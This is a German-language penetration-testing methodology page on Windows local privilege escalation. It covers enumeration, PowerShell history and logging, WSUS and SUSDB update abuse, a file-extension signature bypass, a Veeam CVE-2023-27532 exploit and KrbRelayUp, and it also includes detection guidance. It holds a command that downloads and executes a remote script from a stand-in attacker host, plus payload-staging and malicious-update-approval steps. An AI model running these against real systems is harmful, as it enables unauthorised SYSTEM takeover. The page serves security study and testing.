# Windows Local Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zur Suche nach lokalen Windows-Privilegieneskalationsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Windows-Privilegieneskalation aus mehreren grundlegenden Leitfäden zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Windows-Privilegieneskalation.<sup>[[5]](#references)</sup>

## Grundlegende Windows-Theorie

### Zugriffstoken

**Wenn du nicht weißt, was Windows-Zugriffstoken sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integritätsstufen

**Wenn du nicht weißt, was Integritätsstufen in Windows sind, lies vor dem Fortfahren die folgende Seite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **dich daran hindern können, das System zu enumerieren**, ausführbare Dateien auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und vor Beginn der Privilegieneskalations-Enumeration alle diese **Abwehrmechanismen enumerieren**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem eine Offline-UEFI-NVRAM-Änderung in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Speicher-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

Über `RAiLaunchAdminProcess` gestartete UIAccess-Prozesse können missbraucht werden, um ohne Eingabeaufforderungen High IL zu erreichen, wenn die sicheren Pfadprüfungen von AppInfo umgangen werden. Den speziellen Workflow zur Umgehung von UIAccess/Admin Protection findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Weitergabe von Registrierungseinträgen zur Barrierefreiheit im Secure Desktop kann für beliebige SYSTEM-Registrierungsschreibvorgänge missbraucht werden (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds führten außerdem einen LPE-Pfad über **SMB an beliebigen Ports** ein, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration von Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen aufweist (prüfe auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Versions-Exploits

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und verdeutlicht die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas enthält watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenzielle Advisories; überprüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die Architektur des OS. Unter 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein Kandidat für ein fehlendes KB beweist nicht, dass ein Exploit funktioniert; vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) zum konkreten Problem.

Ein Beispiel für eine Speicherbeschädigung in einem Dienst findest du unter [vom Client kontrollierte Offsets im MIDI-Shared-Memory-Ring](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Die veröffentlichten Stack-Offsets gelten nur für den getesteten Build; `LOCAL SERVICE` zu erreichen ist ein anderer Schritt als der anschließende Schritt zu `SYSTEM` mit [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind Credential-/Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfährst du, wie du diese Funktion aktivierst: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt Dateien normalerweise im Ordner „Dokumente“ jedes Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann die Dateien jedoch in einen gemeinsamen oder versteckten Ordner umleiten. Prüfen Sie den effektiven Ausgabepfad und die Datei-ACL, bevor Sie ein Transkript untersuchen: Es kann Befehlsargumente und Ausgaben enthalten, darunter auch Zugangsdaten. Ein lesbares Transkript ist nur dann ein lead, wenn sein Inhalt eine verwendbare Identität mit höheren Berechtigungen offenlegt und diese Identität sich im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Vollständige Ausführungsdetails und Ausgabeergebnisse werden jedoch möglicherweise nicht erfasst.

Befolgen Sie zum Aktivieren die Anweisungen im Abschnitt „Transcript files“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowerShell-Protokollen anzuzeigen, können Sie Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Es werden sämtliche Aktivitäten und der vollständige Inhalt der Skriptausführung erfasst, sodass jeder Codeblock während seiner Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail aller Aktivitäten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt ihrer Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Die Logging-Ereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, können Sie Folgendes verwenden:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die vorherige Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Prüfhinweis für das Abfangen von Update-Metadaten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien für den Client gelten. Die URL allein ermöglicht keine Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Prüfen Sie zunächst, ob das Netzwerk WSUS-Updates ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist es ausnutzbar.** Wenn der letzte Registrierungseintrag gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` den Wert `1` hat, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Interception-Pfad bestätigt. Es beweist jedoch nicht, dass Interception, das Akzeptieren schädlicher Updates oder deren Installation mit erhöhten Rechten möglich ist. Bei einem Wert von `0` wird dieser konfigurierte WSUS-Endpunkt durch diese Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um weaponized MiTM-Exploit-Skripte, mit denen sich gefälschte Updates in nicht über SSL geschützten WSUS-Datenverkehr einschleusen lassen.

Lesen Sie hier die Forschungsarbeit:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Grunde wird mit diesem Bug folgende Schwachstelle ausgenutzt:

> Wenn wir unseren lokalen Benutzerproxy ändern können und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, können wir [PyWSUS](https://github.com/GoSecure/pywsus) lokal ausführen, unseren eigenen Datenverkehr abfangen und Code mit erhöhten Rechten auf unserem System ausführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, nutzt er auch dessen Zertifikatspeicher. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Datenverkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Zertifikatsprüfung nach dem Trust-on-first-use-Prinzip durchzuführen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht ist).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie delegierte WSUS-Berechtigungen. Ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das betreffende Update signiert und akzeptiert wird, für das Ziel anwendbar ist und in einem Kontext mit höheren Rechten installiert wird, bevor Sie dies als Privilegienausweitungspfad einstufen. Ein HTTP-`WUServer`-Wert oder ein Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter Updates in SUSDB: nicht signierte Payloads über `.txt`/`.esd`

Dies ist ein anderer Fehler an der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die **gespeicherten Prozeduren der WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Zugangsweg besteht darin, ein WSUS-Computerkonto über einen Relay-Angriff an einen separaten MSSQL-Server weiterzuleiten, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem die WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM-Relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Externen Datenbank-Relay und Prozedurberechtigungen prüfen

Wenn WSUS in einer Bereitstellung einen externen SQL Server verwendet, prüfen Sie zunächst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob ein NTLM-Relay den Listener erreicht. Die SQL-Rolle des Servers kann Prozeduren zum Veröffentlichen von Updates zugänglich machen, selbst wenn direkte Schreibzugriffe auf Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass das Veröffentlichen gesperrt ist. Prüfen Sie die effektive Identität, die Rollenmitgliedschaften und die Prozedurberechtigungen in einer autorisierten SQL-Sitzung, bevor Sie ein benutzerdefiniertes Update versuchen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die Live-Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind hilfreich, um gültige Update-Metadaten zu rekonstruieren. Sowohl ein Bundle-Parent als auch ein Payload-Child benötigen `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2). Erfasse die lokale Revisions-ID, die bei jedem Aufruf von `spImportUpdate` zurückgegeben wird, und halte die Bundle-Beziehung, Digests, Größe, Content-URL und Revision konsistent. Dies ist ein zustandsbehafteter Publishing-Workflow, daher ist ein erfolgreicher Aufruf einer gespeicherten Prozedur allein kein Beleg für eine clientseitige Ausführung.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Custom-Update-Workflow nutzt legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| XML-Fragmente für Voraussetzungen, lokalisierte und erweiterte Eigenschaften speichern | `spSaveXMLFragment` |
| Den Content-Digest der vom Angreifer kontrollierten URL zuordnen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nach dem Zuweisen der Content-URL und der Zielgruppe sieht die abschließende Genehmigung etwa wie folgt aus; verwende neue Update-, Gruppen- und Deployment-IDs, statt Beispiel-GUIDs wiederzuverwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Dateiendungsbasierter Signatur-Bypass

WSUS weist normalerweise beliebige unsignierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` jedoch das Flag für die Zertifikatsprüfung auf false, wenn der angegebene Dateiname mit `.txt` oder `.esd` endet. `CheckCertificateSignature` wird dann übersprungen, ohne zuvor zu prüfen, ob es sich bei den Bytes um Text oder ein legitimes ESD-Image handelt. Daher kann eine unveränderte PE-Datei, die beispielsweise `payload.exe.txt` heißt, die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Policy-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Der Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Die Quelle muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen initialen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung verursacht das WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und wird mit `BitsWebServer.py` für das Staging von Inhalten ausgeliefert. Ein minimaler Aufruf in einem autorisierten Lab lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Persistenz durch Wiederholungsversuche

Die clientseitige Interaktion hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, bewirkt, dass ein genehmigtes Update heruntergeladen und gemäß dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort nach Beenden des Callback-Prozesses erneut angeboten. Das Verhalten bei Wiederholungsversuchen kann daher zu wiederkehrender Persistenz durch Ausführung führen. Dies ist auffällig, da der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Ansatzpunkte für Erkennung und Härtung

Nützliche server- und clientseitige Ansatzpunkte dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Targeting-Gruppen, externe Content-Ursprünge, `.txt`/`.esd`-Update-Payloads und von unerwarteten Principals (insbesondere Nicht-Computerkonten) durchgeführte Deployments untersuchen.
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, das falsch geschriebene `FileVerficationFailed` und `EventId=364` überprüfen; die Verifizierung anhand der Payload-Erweiterung und des Content-Magic-Bytes abgleichen, statt dem Suffix zu vertrauen.
- Wiederholt fehlschlagende bzw. erneut versuchte Windows-Update-Installationen sowie PE-Ausführung oder unerwartete untergeordnete Prozesse/Netzwerkaktivitäten durch Inhalte mit den Namen `.txt` oder `.esd` suchen.
- Extended Protection for Authentication für den Datenbankdienst verlangen, sofern unterstützt, und den Netzwerkzugriff auf die Datenbank auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die benutzerdefinierten Update-Prozeduren minimieren und überwachen.

## Auto-Updater von Drittanbietern und Agent-IPC (local privesc)

Viele Enterprise-Agenten stellen eine IPC-Schnittstelle auf localhost und einen privilegierten Update-Kanal bereit. Wenn die Registrierung auf einen Angreifer-Server umgeleitet werden kann und der Updater einer rogue Root-CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) finden Sie hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Aufklärungshinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Aufklärung**: Listener und Version überprüfen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Advisory](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Anmeldedaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separates öffentliches PoC zeigt einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann auch an Adressen außerhalb von localhost gebunden sein. Prüfen Sie daher seine tatsächliche Adresse und PID.

- **Aufklärung**: überprüfen, ob TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten untersuchen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Hinweise, aber keine vollständige Patch-Prüfung.
- **Erste korrigierte Releases**: Veeam nennt **11a build 11.0.1.1261 P20230227** und **12 build 12.0.0.1420 P20230223** als erste korrigierte Releases; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch mit derselben Build-Nummer unterscheiden. Überprüfen Sie die Patch-Kennung anhand der [Build-Historie des Herstellers](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als korrigiert einstufen.
- **Exploit**: eine PoC-Datei wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ablegen und dann einen SYSTEM-Payload über den lokalen Socket auslösen:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC demonstriert die Befehlsausführung als SYSTEM, wenn die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Anbieters beschreibt das Problem der Offenlegung von Anmeldedaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

In Windows-**Domänen**umgebungen besteht unter bestimmten Bedingungen eine Schwachstelle zur **lokalen Rechteausweitung**. Dazu gehören Umgebungen, in denen **LDAP signing nicht erzwungen wird,** Benutzer über eigene Rechte verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer in der Domäne erstellen dürfen. Wichtig ist, dass diese **Voraussetzungen** mit **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos-Relay kann einen Anmeldevorgang mit geringeren Rechten in einen privilegierten Verzeichnisschreibzugriff umwandeln, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Principal über Rechte für das Zielobjekt verfügt. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) sowohl RBCD- als auch `msDS-KeyCredentialLink`-LDAP-Schreibvorgänge (Shadow Credentials); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert passende Delegierungs- und Zielobjektrechte, während eine Shadow-Credential-Kette Schreibrechte für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatsauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

